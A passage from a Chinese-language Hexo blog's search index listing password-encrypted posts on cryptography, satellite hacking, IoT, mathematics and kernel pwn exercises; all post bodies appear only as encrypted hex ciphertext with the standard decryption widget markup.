9e95b7b095844d324304fdb3b8ded4ae21a93a9efefb7eff2e11860ecbda42fef4d22fe946c651b436eb8d63b25e7d18b2f07e04cdb54827b335be7e7f6f77a9b51167e7c74340d86bba04523ea39817e099f0b02b9920bc5f0836ae545c6608b27e4f50d1e2da3faa3626b369b0d8c491933d6d8f74811ae2c2b70f9e1d83bcfa5e59a58f2824bbc3585b52c193ef32609fdfe9dbafdd983449fb7ccd9b78385c8a7475d67835b3d709251780b5150960ecad69aef21633ac8dba5d11901acf89b9ed9a462bb2634ab069dcbfc858019379329ec18355c051563f7f7ff3a1c1f8c9861ce013f5fce9da247d8e680b731d8d798065709daa2885e4c82aa32fbdfa58f0beb68c2e70671019aae88cdabcc67f21c9be99efb93527e351eb691691a2b7433cbf58baf51ffd8a2b60f8e5eedbf9decb6126f4d73e85c1838b0223418dfcc0e767ef3bd9b67562121c639376e8ebf3f24e068e99db8d0ca7a9712aefd2b2ab0135dbf8d658a6ed157b165d9631509d441eff22c6161101456867175d470f79cc4585f5f2b93da402f0ecbdefce100fd11a779970715d6de5a0885e98a10b98c7141d7113f8bf0a345224212ee3aeee9de8b2302f877514346b76eb04d385ab59c94996946e813ac09cd5789adf629232590e3e6f5c6fa117b0aaa1192a64e4e31a1f37c1c92792e3b07fe9ff7ac3fb75b3df9e71a59d1046db8b14f4987706d4c66ea6f0d8a0c2995cd5046299603241948d02f2d5b22a156bd1d70956c74fc4a547bcbdd5716739e814f1b970292d10d7fa85fa2abc128bb452da4be67edebfa7359980fb52227569b57eb4ac66519db8d0cf1efd029f70f9e0ee6a3cb0959c00f4a8163db936a0db29fcf7c148c6b48ad42c49eb7265d5a174bbdf99a816901b3195a132ea0db5fe69ab732946e04f477de7793c172c60a5104a048605c59336517378c025dcc722066978b7dac72fd1b1f16138aeb5394d6a7020ed8b19a1ab1a04b0b6c4d2a435643df6bb35aeb28aa341c473b30dad7dbafb9d317d9096c3d6e3d2ad4cb9e5195cc3130549898424a764c6b5ba7b44f66b9062174f687547f8d5ecdfb1dc03a503bc9392bca1f86d98de7a80d3992d5425046dc9503541bf72d033090e777e455cf00ec6aca2c9f81b789f9f758d78d9c7236336049369de70acfd028516464afde15c48f147bde4fba62c13a7f9eb672a0f59cf53957f7b7fdf83562cd14d85a8979e1dda6852775d0b352abb9d7ae615e98337fb8ce1906c236493072f1240e58b1e9dd2523d586e263c635afcbb52af6ee9023483c9180918718d50ae1aae1bbd675cb77d0c78dbcfa12c4b62dbd30580a00f0acd909d850824e75359cec26abd5b0c0373f381f3e1048e0c68d10cf6e3c3c075a00e0240587eef1eaba442daf3c30301696df3a5265558ae67e2082657e279eac98450f43404f9f54f17de879e4932cd15a36d87cac439a1a6afae1593a52ff2f3d9fd7795f480833fe666ef4ad17d90e911153660f7606cb4ace1e5e1c26c3ff74618009e87a98d116123a004bc8eecf9d31978d2ae0344b0e76ebdfea0e98130cd12f26b8b00702b2beba1beb9c2fb119ff5673af60d2a9da4e2b3a35668cd0e81a5f889c357baab157f9ac1b5aadbbb989ae3957d1faa6cc2ae4c888cea72d6388e843260bce1dde00fd2b24cf7e840d876ad0ae5a3dc97b8d13c126b1b647f1f2fec185cdcdd46db68e8691586412ee80478f2d4180d144e3295b5c0b070a10f2f83d36c0e54bf0cb1d7426ed861e249de30a3b378937046001829b3992bbd9459b474d7a4c5407c01980192fe2cca16279fa9deb2684223a83379f5b27d18715fa1f1c683e6f3c48d9f31524184d094cc582179f4ec1469349cbc6fe5d29d6bf8a625da8a354c9ede2daacfb6c371db2836531cdb8eb704b65f0300a430980ae5de0382160221903d24fd3641f994e7833ee10112c8b5869fe36242c7c28e5f197c07f1452b1ae03c4e5f3478e06d43be0cf38859bc28c7dcff1a7598979fd73b7ddf98464ec68a4c7f54aedd14db5aa8f3034f473bef71c9e32f6b02f5b1b9a10b41001a9387fbe86025ade3bdd3132ca10f528d36f58e57acd7851de1c5256fd7d73ead496b0bb257f6f249e483a911c36e47ae86ecec17f5d9cc5c110f52565492b3f6d0477fa4b8e968558dec40aa5c9a50deaee73cd5e5b5e6b2710204d36ede182664442512cd1e5a1bb75ada9c2aeea759f3abb226373f05acd0fbc82e4da2907f6ac86d08afe6c710748394cc23bad1e4306e4e18fdfc89fa06d926f46d1abc7674eb42640276ea2c4d64e14b8347996400a18b66dc55458f3a8ced8138feec6f44924aad351913a404b0d1136ac29f5f2d758121458cdb485d70696536b469f5fae654c310b513e5f57a801401631d960948a7a44dc2d8e261bae4477bfa1b5ceb96b5a3407c67a53c449efe0e1cfe9e5781e9f3c1fa1cd830d24ccb6891ff56f63f0dbffb41f22a1ce29e1f0bffdeb02cffbe7c7a44f1edb6a525867a324f0d091c120b07effe6b701b69b4fd8f3a999c2d26f25ce02baa39fdd3ca52a2819d2251a81ed99a461a401fcfe503c7b2342afc750b0309f7ccbf3dca67ab128d039888bb414e205bc1c8923e47072d09f96d349f165661e3bc3b8b3e66dedf09519014bd1aab9607417425a972d6a9d0eaf55fd2c93a6ab22be9be640a43fd1e1056a71942773d04684773281b39e63016f019243ead8be34ca6fbce32e3f58140032da865e49d9304f29b518eb0a3dc4758d57bf81aa597056533c0fbd02e0ad8bee92beada5546c363fdfb60b66466efc6813f0aa5ad59c2c1436276b0d5aeb9e52fd690fd16303561eebcbdc3e395c7abcb7129e41f1335fb0fbc95bb5b3fb145587a202986c1df2a95fe272299d15fdacd9bd64eb62f21d6da63a6c482d59e5754e1de2659c7dcae0731fe48d58e2294cbdf1f77767c190fd7cebb8c7a3fccc7c6b9e978fc94454e3d390202d6969cbad60e446e1214f9281cf9b92e8185926b6f8afa26fa76a50fd17bca1e4190c8dbe7aae4812cd3bf181ffcfb0265108f75feeb208bb7713d1bb18dffddddb35addcc5149c3aa4f69520f31d018fce98099855f2b2b3473681d734dafd734004aa645c32cba994599ad0977ce93deaace4baac212af468c380dc16bc6e2a3feba07f460ed9784b706459ab17508a802f776259674e72926258f7865308f1c0bf74dbe8a0d99b5656e442b80187b71d9dabb376a3c85f782307f555eaf5c2290fce7d4db30d95dada8afd187e56f8234b0f6875169a1bdd4a9de5a01712122d7c90d8da234f674f0d9e31f60f9699b68b4f74c2135d803eebf4eab157c78e900722ba7f9e22bf0ebf5d9acc7099d3b468e9ca6e699794d0c371ebc0338734e65085935c383bc75764a7ac85c3de20bf2200d99cd99483532d55d92e7b4baf347e41af7a285870faea9dfe05ee8f360d2a5ee1f7b2e0874835cd0030b1a82484663a540c4222cbac33f3e5ae6f45e963a8e224f316dda146fc9cb174f0b0166df123c06f343b10ab7d91561df85fbe7ee48e8f35493a877011b787975be6c6cb6037d1cf00da2d46e15f500c387508b6eea3b1d6e2f3a35c79edcb0b1512a3711ea25e80c1a948721d18924d13856b42185fcdea068d6ec0440170ebcba9117427a4cdde268f6c26a29c2dacb904a53c480367c4af0b7bc0e2ff02b3d61b0bd90af26a7303fee671ae04fc42cbbe0cfeba5770d791128e2bef24e6bbcd8e00e9f00b08ef45eb54b499b7c6c7d0d090bfbd63dc2817822c792aa08a89aa200dee2e6ee8299bfb156dd343662fbb471a0cdda138332c7874624ea3375c6274dd9f40eb022992e48e533bc78f740c54e611850b86e5a641ab88670351ef9416d89a862a71b67f4034b9141cf17b1c95c5a35a14f132ec90bff244f34ec97633f8867c26c8606658a06834ebc7c951cdac316d1c281d75bf79693ee88046d6a9ce70264dae98db543b0ad4e39bc8d14bd25dca8e841a507910ac9c23df1c1b69cfcad6fd9c934b903ef26ca5204e63668e1ee28723901522eb03ba7fe35172afccb613fea3c37e830941947d4c8719f26080628f4bb6c6d7fff07359de4fe19e049c6082243df7d24a81496f469a8cf177afd04af70b60432ec3bd56d0613122562c72e28c21caa0c87118a86ee0ef8e69e20336a79508ab83a57e3865918118d367fe37beb11eb2c0558c2cb2ef1faf4a53eb1d5226aaf98b0572265c505f83c5bd3452fa436627a82adaf74093eaf25172f75932702e3a88e0a1b3b473bfc2c4806e5b1972c064a7f73fce3d6513943665abc4659ccae708702a49a2ea986ec21538fbe96f5cb4a059b2cb9aff6bf26e09b9cc128e4b90952f5f75331cf73aad6ac0b209aa9ff43aba60ad33cd7c7729b60eae37f59751dbb687bb6e0c61ce760729ea9dcdc80f29a347236e9fd86e7e3cefb5a5befa6b9db488890ef25d54782be1dadf6e51572cc13b853e350ef9ae5da742cee88c3972f5eb326a5c61dad5818fd4aeee04a62979a5af9f9d6ded2c2ad02d46c3a1ae74dc040896a65b82ab51b3e627e73787618fab805e1fc84a28c1c280c3b3b8832c7ab4511abad5504187859576c57404d5f2ba4102728eb1116fcc3b3130ecb814a018da5d763fa346458d47a518f89507d0eee1352dac19769613932da99fea61d037c73c920e1c1891062b6a54e6499a18f5a3e7c107274ef0e3c1a3e1a3710c85d272a0ca7d20fe425898401e06fec1e9605273090eed6b7baf4865bf02a6d01ec8f272cfd13f251466e75360caa1de75acf043be4e7de6d47a51cb5109cfa8ce2eb09911088ef7f585f595345b05db49b04908001fa87d5ffa4dc7873b7f1f702eb0403f7ee18c4dfd549c1e49c7349c74dd68709a249bafeb37a24c6de4c013a7b13695015f8fb160e8d9eca7cef6bf1d2a4c8c95837cd19e56e178a26ae0eec9e64c34697be77358b954b14c0846ce72c27b63c43128bfdc5bbb8c2cc1ac9f568f7758697fe82e0cede60c3efb089776fe1cae09f738062dcd079ad4db1a1577a1c8221b8f60901b78f5ee51035d6d9aecc3c671cfcda8fe2f99db83442fdfba00fc082eef25b04393e2a99fe7a0303279184d28d1d4413da27b8fdfeb50553199cd896e0e8caad3369968b057717ba5bc90947bf9f345061624d6044076fe63bb4a967c2d0e3489793e459ca63a30ee9b1d20cd11e2f38aa080d1cca9611040a98b327a9946a1ff59f3a0aad2262e5fe089f7248c34a5940068a921521e33e59b334a348524634ce6cb7559f0cd90796fcb93702d586d00029f7e94d60b86a8a0b31d33ea74830577ec5f4187b258e04e9c803afdf1cdae93c8d100a859974638f3e31d10d6e3e197c5db396236060088ff108942407915415b5aa4fafd241e7d21d65abf892375eee3c1ffe8e328c456b2e4a59d37882e4f626206b0d71b827fc92188b3833ef9c38bb0a68cd5237f0b8843e45e3cc5d8b50e82f2f0e789fa4e64c56750f2ed03c35334a493dbca6669f7ced6593e23ca43facceccebf1972b667a0fc2c50767afe96e2251deef37083f1cd0908c0f0d48866c30ed8f05d67ade26a9fe2f25eda0d2755611c445dc32d39cdae340a3c89e4decfe84e027696d48d2e3b4c260e0d15f489a53370112b3f2c936dd97fd84a20503dafc7b7020fa030433ec6a0e55ad2f6c5780f4dc5fa86c9b2a0ba6c2242327630b19beeabe88d94eabee6bbceb0f6e23112d533492d9d1a4b24cee61bdfc33da3252817446be3d2f8247a8b5a6d73320923db51fb726f1afcda146ff1c507bb6983d51f2134d52f6a8b3bd2ccc2f14f8f29adff7e4eccefb6a73dbc127a755954a04c0afdae4141eb6fb35c7d6df302a1e753c71a552b89b67669c97239b375b89d3b01455bed7ff5039747e65b12f1bd8acaa1bb6147a6a9b31d72912e55d9f367abc0798b2115405ceba3ec60dab90410c26087bdf4b6de36024674c7183e72812b4d79c0d412076f656127f3baa6ed7d6050317fc249f6008050e84d2f57d5fb4e60ae16a40bc9ac776832dd2eb8ec60a2faacdbe4007f877f85f2d0e320a18a57f8cf9adbc9745179a27e605049a5cc8282ae88ea6519cf6b8b816d82d444f3b7ff0050d3cc2bd547b06e0b49daafbda57a608f0192739ef5f49b3db1afd98b16cf6591eaedd19048e82d4a72a27345f9ee6fd1b89d16e2fe7877c50a37ff54e5e5a728a68cabb406531f5373903871e3c9365f7335f0a5b7392c1499237ef754820ea3ede041c1c42b36a1f7ec98b6301c3971837f6615197783947c811e85510208c167fb0e971cedf123b4091c28ace92d0819da76c8dc589c0942c4a918f71850be994ee11dc743127ba2c13929cf551d1698dca09dc0a17afa456a2ae747f00bc4d4988ab862fb03d1d2c840beddc431f101e841f122c4d3b1657d578e5ff1f26ad2216543d98811a36945a0dd98f58f96bdc92a5a4a92d0fbd1d4876f770082bba28ff04fc69d1aa028b171593a4148698e69cc8924b7499450caf0f95e9e01441d7afa66b2678337d2569fd7b1e3cce5d0dc3f3edf7425f901c84a8eac16d2d905a95c7820368c46b5adc2c2b31923ec8cb106271b8001b5eae85f369e35eb3cdbce93c3f52ea2164815bd66ff0ac6cfe6443d70a24c38642f621762ddb83ba8fef50257766f0dd2e97dbc7d41cb99ae018950cac526229c266df087f947f061f60a07d709d32e53bd53867ef0a501a33dc47987a641e65508b2a78131d56a3b9c299be561c540f96679b1ac219492aea27bd1231a99d166c573a56ee4fc0bcbca2ef2e572bf6bbafedf1659c99f2a1c102aa3b3dc23bd9fe44c86bc6b588f735522fb4634cc903baecdc61c908bf27b239a46a90d1eb8ea710d771be7dc9593223dac43f2ebfd82a3589ba8bd2acf147a47e58f702577a86761b4062223053b36179e8f7467de62b65da8e30cd1b89e9ec827e3e74110f9c799c170a4fc89991a70bcd706463c7b8ec9b7c02cd5159eca840cd1545d7753363b4ab76cebf5539d2c02d918ba01a4cfc0805a4cde97181a45b5549e385c5b6dd12f5452446d90be9e35ce48ff3fcc0f1ed5ea53e57ad0dbca1f9e21346c1af1d29b9f1217591ef7e49dc9fe1f2057f86b00bb4cc9d34de788a7a8f66a39655278e1cfb009aaf49c0178281690ae3a59c54795c26a613b34cfeb63432684eacd9d8c5c3556a3513fb7d6b0d3d1e301c14ee50b995e107e3faf136acb16295032e7d1a2f9be1b9b1c706ef169c34d11bd8a39dbb45c2f14078fff05d94cff307753b6bcfa9ddb8ba2d0f06d07c49172f7dbec9378731c5783593390d054b70b99160f0de4f765ea611eb987e4124dde107d307fe9dd1fc70e3285a6320e6e1eddf7a125da99f3c17c9daf71418d632436c6dce9cddb0487b2e50aad3bd8df557c71bece3fe62bf857bcc94f752de783188e45d5acdc156debba700c9c76dcbe3ad1b79db0947681dbaf35d95dac08412072c4f8e59f57f8fe09b2348a99046bbbb64cbdc4805ac97627be3cb85a6d7363c7c3c51bfa5bb15b19a787c433b751e400686a32b8337bbb313a22b6bea996d3f25fc566d6d2bb01824f9d9f16b48f24547c9bbd0e9de1c783a43d239c0139ecaeb861ef725b5e3dc0dccee8589b46862dcbecb53f364713ca1ef404eb8de3c40ac5b43dbdbda9b95bfae54e7ee0b20ea96898ba00a0769f0f60f7dab14125098133ff14b38824a17bb57e50e4d3652c1ab826304b5d97467de172b76abba7ddefcf301d6601c23280aa31aa2582153d748f414895b92f2c3fa17a3c50622798fc2dcf933d8c76b8862cc2b5789354a82ab37f1c106bb87c9009e7a55c564eb95bba6eff15ae5593335d5069060f55c79cad42a53f6a54c4ad689bc8df6e3c0a16c5859377e79576f1f0c3175d8febae31a5aec9d01e1dfcc0b86ded124a4ba5877c6fd6aab677361076feb1623892b10fc653b5aadb5f4369a61c5b5240eda9751c4923cfe8fd71ddfe922ca00ff6828fd281fcfa4a64214602d3eb63051f6634b412a38cbffede4d2dc05aaaab2724244ad28a651e7896066c3b7e144eed87284487530d50923880ac975df5c42b2cb6b57dd25e5af7255832656be0cd8f5548fa40b8013827bfd4cdd75eed764e08b67ad9818438b2732d51bf2ded33a3d2592796f198d9377e65f99dae12705934a0068f76f68420cd1e108f6f908053602d9d42f49f480b91942f70fb90e131e6a4627340736edf97c944f9acc482aa3673d405bb3439fd54b8970526399177954d4e69c848153e865912acb863319b99b1f2f8ab44069ece0b6b995149429e8652b0516b0ccda9a9833c762258d251af19ec4ff0ce2dd5a6a483c0b2d87046e0f4d4726a9b6ddc0d03fc40d2ba080bd9fd6da2c1b9afc12760dd91d37a4442e8114108911b88f268b56d23395e9df2183134a4f9bff3bb7302cef1505600d260e3781c8ef9a1664b12960530dc26da329eacbb90db5c5945e4e5455957cc89809084ef1f78b3766a0550ca4535db2125514a705d0193262b5f57a58e6a240a90d2bdbf96a0e33f142be7078be9374465771b7b48ccf2ebe8f3d7bd35d0c53899725fca79d13d18d67330ddb68ce950689ec24b82002789ff99d8c51987f9ef751920ec76e3e1ca8d75c5c0fdd87512610207233612ba284981f2e7ca9fdd5a267b2680df5b1aedfd7b17d8964af20c41bf54a28a483457571a5e20bcc23a2cd2b5bca246c2b36507540ce3f7e4e10a1828eccea6cefc221f0e56931fdfe2f7778a6dc45b1de1ed098293b55396fbe22ef48323abc5c9bb92df4cb8549685ad0bfa9fa943f957973cd9abfd36f32b7d31f6376c71c1d3808aa7f51c71eb5ce658166edefed536ea0bb48f9927cb6a656308813df6f94df1b3027dc53fc148b82da9bf96e0e74d762cf6b3bf9e8e71a263eb48667fa2e57560560b7e9833d40957563fbb4329ca40bdca35fae59c4066fd3eda27994376ae59dfa412a8876014d36c629d6e1d001a88ce5f1146c137a47aedb3768016afc6211a41a3a8036d85927a5711d68190795ebd19ca701ca34a7e9f4c08d91fdae48c0dbc3ecb542f77bc29ccf70afdd9d7761b5911dbd529e45143b2c92e9a8d465f3c5be33488c7e2b65fb21d91a6702f3fd8b0361099ffd050bb6fcbeadc0f5e1edb2003c23361fa70af216167cf185108123eb3eff561d32383d29dfcef09552428f8243231b9987911a355192c214b95dcb2dd285aa7f96cd376f6becca7a03f92864418ef0ba622a79defe9bba609482db34ef6e19a6ec4d667b0539b902b5bbb212b58b653d32fcf9642d42830b13382b6c450eb1b5b10598b10aa3f00fe708a28af313f4b46884b981ba3821509c48411cd46318bde2ec583877bb893b0b04e86520bee6c6772b55a9d251d68d45d8ccd747987c1b14df0a464f545f97327a0e7e2f24354f5a5795680fbb7db7f3634b667cc4ea2723a991c5fec11ed6cebb29c5d42abc8976c25ee986f3c9b49945ba9c2e97b9da38dbe613d8aa108454301f7077628a184a8910c0be646d57f622358219552f885f6007dad4b626a1832712a08ac46b3f756786614f7e38d306789825f290d61f2230763baaab8e354b32941a7fb8970a63cad9e47fbc7528f487db3eacb3e5cefe9e2e6caeae167bd996e0dcdd380ceb6cb795f51e26aba2ef43032f6a1cf2d00d771b0877297323e40b797c38bfb29ad77bf45979f1c5d4eca6251c8db8b581f2d8b85d54596c8739fe6451133bafc035d6e16c9b04da3da54241049cb15f3678c5b3e8941e171eb14698dff9cc88cc08a5708daff0d7eda25a68f71d9891c82a937fd557429a0e56e08fc529885b8ff6554ff509c11e03fdfca3ada0de9ec83f5d84a568eb5438706f7468c000fd0caf3d9c9232640709f7a2c42adddb12bd2573a9a1a3f9326281351ac7c9096ec9692847b36d6b56846b0fc89b11dad25e6867c49029065508cb16216f0068ec37652758588e8b014501ef9f641d0f8008a4310e82a2dc8d78c802326c1d8e633f8b2e08aa103dd84d5c509348e631af1f7a713a9d0799daa6dd46f495fb5fdb4c4aa2f4916050d54e00ab3ac56ecf217bf377206e615a141ca566c727ae0b9ace2de0af9fc5abc05370a9c4173ae705662ebe0ec6461c818ac2e2ca40bda8670f18a68a1dc7879bcd434e88bca2aa384ad43b5e7a0574ca6d0b9bf36c47c4bfb61a0c1765352e898d58c0dada7b10c1c0c6973b4a31d75b38f0701b04d7886d8551c7afc2fe40e73de7da4d4374b2a572fd9e89a5f933b8dae4b3e167c7d489c8e0943c227f79764a409a17d91d1908cf5636a5ad43b4b1e9a0b4ec16520cdcb21224f2b379d6c80b421f33332581966e40b333cbb2f8d0fe3b387b281a1fad5adb483484f8280a1814cb6e1f33bde64ae9612e7f507059dd50fc09da4d62bec497ab6f9b73d611a62ab9451e2606e3ef6ea11f4564812794fa9e007c9de4685f8633c45518d11104f5993487c753d5b0cbb5f90087126fbec4a63f2189c8435aa0d80d12488eb71ba5ba74168f762cceeb4ba4d9d99d8bedca14d02a2390a90dc8c7c66ef2d367751d440ff57e91441b0a5ffcf99098623d2d49549ffbece3c2c2e7cd3d90e7d2cae25e8b873a727257deb6df47dd27dc1c313688bf3aea157c1be05fc3afb96ce544606adc8e95f0e51a07f055bc0d0e18361e24cf941d3fc87fb8dbc23c72c7294e632b9cd01871165d2fe1a9b254249ac5a24d0573d09c8a758f9f468c1d8bed7f43be3fc4f4d47af047a1cea23dd42efba8a4ae4281aa046d1a29c153ccef15229ad6961dbcfb33f7c900658f24b578235f421785652ff44f7f072436fb6d0b1de3b4fbc4a6dc14299c5a1ca48df82fb20acfb220e68f71a82fca1301dec4ea935210cb2253bc6384b9e799b38611235ca15578345e890cf5d59f9205b0a7c74010be41a7a52b81b27d9e9f0bd745e84e83ad71979ad3b291fcae238b27012e47dec9cd731184c809b755559e41a618117c22c425b34b26c70dfe4d31a8feeda586e9c8b09dcfc2819bf270ad527ee1d5e1a4e1931f6a86e8b1d2d8fda46d2dd60fadc3594a20e3315651be3075a59ad2e35f2f4d2676b2b08fbfc5230947ffa8dd386f7293eabce40fe4358808f43e8753972e8e728639074df958c661dac8da284c1cf63b1446dc849b2f4db5066fd7faa34e8c0d082bbbbf5672389e32191876c5171c23e43d38b1d7470ced9d25118f592da4ce998c9d897974a52bba78091fe004dc51a70253ca960764964c9f1c74e44d7135aed6163bcc99f0731b37895f620ad72b0a94055804d9f8ea6b2722e8710bdc404f5fe106a62d50a7a314630cf588f5692d40c53bc05d0fe3323c9486345f9571fa2ffd27ffb42ac8c8811b41180ded8ca83c8542a49a2d605c6a848112791be78ce9c9e779baf3352fb6835288c552f5cac84ba04bc06f15b0ce6341f46a2c4be9f83ab3d4bcce6b41a1d582d638c1d83d9d11586b311aa53a91c1eaa236e4d141e8bb0bc2593265969a5a702e71b658ec04d5f35373112a71f1d8f3484b4e4820b0b70fa8aad2649445fa6cd428deab981128c4f594c8dd81871329559390ab824cefea6d1da559fd6db3fd129ec09fd07e7c94378f665e3b8fe27b817de40bdaee29dded991dceccf25d6249ab26f109f99ebe9b3510501b8ab0ab4df9005adbacf6d0f439cbfdf0b8f6588eb2b7bc86c2ecf405ae6a237169b868b28fc33c7b15bd5f6530169d0fb67f225fb8ecc31b08bebf6cb134abc8623effa6f641e35218fba5bc695ff3b9ac3eae1be2eb4b1141a802a921cdb2a068c1c2766353b11449cc4304d10a7d5b49ca9d29d6f9140b8a0b2d15577a8d050cef2d966845970d305f4cf68df05049bdc8075e40ebb1553a019ad9997c0641a1b73f9f10119ffa6d036f67408b7fbe0fc8feeffc29f0f23f4ef903ea5ce459d8b9776e7e5490b6c6a07accfd6dd584198e0b39a95b5c6baf05bc2f041460b3d37acf12f1189cf84f91daac689cacc69f7a5f392c0e7d1182906b08a193f3857adeac0d511a716ad01440f536ff3fb0fe552a99fd48c80646af2aa527adaf2dba365fc0aea0cd224701ec46969180e841dc063f1ce0c8f7f951d55b0294a3204d2a3187bf4f5e635b680b4e8d8d7daddef8f20ed2d996d6951e101b6bfb70ebc09ae47d4896965d848a953be250f290871d8838ddeaf56d6eacbb0b8e30b77565d97f95e544df370c5806733b203090de52eae8e3d8291b641275eecbab0fd46e9ec68bb7426ec131e2678547736d89e92a3daa59f6dcbfb2af824fce11662ebb5f6656049bc3fe9028d273306cfab8bf77f7a2240050e9e9f61d39727c02a69f9f8a75ebabc97e5dcfa0d6e04fef8c83c0283d7436e73df372ff9b6c0281facd222028b4238c0ceb3f8c4c853b44fe2988ccd61bd22b80db60306039bb8e3b8480304fea5a678f9ae567c13d6a255cef4c286dd422fdb8377eb18890c9f7aba1e3ca619be8417da3240d6bb9f2f46f438fbf4fe0a59571dfe95b59cc9b35462eeeabf8aefe2e87188190c1b656ff9f5a9a052c2e5b080456e2632a0969c5a6169d7c7b7b2eb3fd33c768f3d4ae014e5c33c68df32786e44410f11134c3f97ff8be593094d6d36a5883b143e15ee4d6e0d259ba595725f459af2ccf0e8de9ad87072aa42f1fcdef3f2e12144a2380c00fad2187d246a74026f1c335f6cf1091406667bbff6a1968e03b601dc05cabcb491c8f9ffb704dd18890b9dcf4047c0a887eb0f77be936eb01cbf146cce4135254a9a97e97aa8cd6ef8f927431b6e9b681af8fa687d0c63ff439a635b6bfb4a271e4f3d981b01c5535f75b271f517fba0f2121d5986befe6921531212210d1d8037e718cab2369b3135cc28037410220aeb10883035c5606754c2345dfd9846a40f96d756e33032d5573296a8c209b49c85988d297ab9041c31955b307b532586503a2a5601cefa0f5977be2534082860f0ca84129a3acd2488e2a67f490508881e7a2d187b3f9518c484acb3500384b525ae155afdad24fba121e695d5ec03af1acc4bb5069c8d656def0e7c5a66b2b40c622a45894eb4b1dc19be610eb6659390769adb1208075bb08ac99ebf9a4ff8ffee3f6136e7597fd4a8fb3848431e7076b2fba3b0c9280e805690e4847385a0</script>
  <div class="hbe hbe-content">
    <div class="hbe hbe-input hbe-input-default">
      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">
      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">
        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>
      </label>
    </div>
  </div>
</div>
<script data-swup-reload-script src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      <categories>
        <category>Crypto</category>
      </categories>
      <tags>
        <tag>密码学基础</tag>
      </tags>
  </entry>
  <entry>
    <title>如何黑掉一颗卫星</title>
    <url>/2023/10/17/%E5%A6%82%E4%BD%95%E9%BB%91%E6%8E%89%E4%B8%80%E9%A2%97%E5%8D%AB%E6%98%9F/</url>
    <content><![CDATA[
<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">
  <script id="hbeData" type="hbeData" data-hmacdigest="fe8cc9e8e651bf10bdee690168d10acac9993d74dcd4c5262dc9763cc6c56acc">2d806215ddc7c4fd1f6babc1a9ab678d5631f1876bfd11d63fd6ecbf724f9357</script>
  <div class="hbe hbe-content">
    <div class="hbe hbe-input hbe-input-default">
      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">
      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">
        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>
      </label>
    </div>
  </div>
</div>
<script data-swup-reload-script src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      <categories>
        <category>HAS</category>
      </categories>
      <tags>
        <tag>HAS</tag>
      </tags>
  </entry>
  <entry>
    <title>IoT-入门篇</title>
    <url>/2023/10/17/IoT-%E5%85%A5%E9%97%A8%E7%AF%87/</url>
    <content><![CDATA[
<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">
  <script id="hbeData" type="hbeData" data-hmacdigest="4ede199db40f29b037c8a719af59419279ef83db4380d9d959fde8f9f742505c"></script>
  <div class="hbe hbe-content">
    <div class="hbe hbe-input hbe-input-default">
      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">
      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">
        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>
      </label>
    </div>
  </div>
</div>
<script data-swup-reload-script src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      <categories>
        <category>IOT</category>
      </categories>
      <tags>
        <tag>IOT-Start</tag>
      </tags>
  </entry>
  <entry>
    <title>计算机科学中的数学</title>
    <url>/2023/10/16/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6%E4%B8%AD%E7%9A%84%E6%95%B0%E5%AD%A6/</url>
    <content><![CDATA[
<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">
  <script id="hbeData" type="hbeData" data-hmacdigest="fe8cc9e8e651bf10bdee690168d10acac9993d74dcd4c5262dc9763cc6c56acc">2d806215ddc7c4fd1f6babc1a9ab678d5631f1876bfd11d63fd6ecbf724f9357</script>
  <div class="hbe hbe-content">
    <div class="hbe hbe-input hbe-input-default">
      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">
      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">
        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>
      </label>
    </div>
  </div>
</div>
<script data-swup-reload-script src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      <categories>
        <category>Math</category>
      </categories>
      <tags>
        <tag>math</tag>
      </tags>
  </entry>
  <entry>
    <title>深入理解Pwn_Kernel及相关例题</title>
    <url>/2023/10/16/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_Kernel%E5%8F%8A%E7%9B%B8%E5%85%B3%E4%BE%8B%E9%A2%98/</url>
    <content><![CDATA[
<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">
  <script id="hbeData" type="hbeData" 